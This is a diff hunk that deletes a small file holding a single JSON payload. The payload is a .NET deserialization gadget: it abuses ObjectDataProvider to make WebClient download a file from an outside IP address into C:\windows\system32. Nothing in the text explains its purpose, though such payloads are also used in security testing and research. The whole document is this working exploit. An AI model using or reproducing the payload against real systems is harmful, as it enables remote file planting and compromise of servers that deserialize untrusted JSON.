@@ -1,8 +1,0 @@
-{
-    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-    'MethodName':'DownloadFileAsync',
-    'MethodParameters':
-        {
-        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':['http://35.199.165.103/any.txt','C:\windows\system32'] },
-    'ObjectInstance':{'$type':'System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51'}
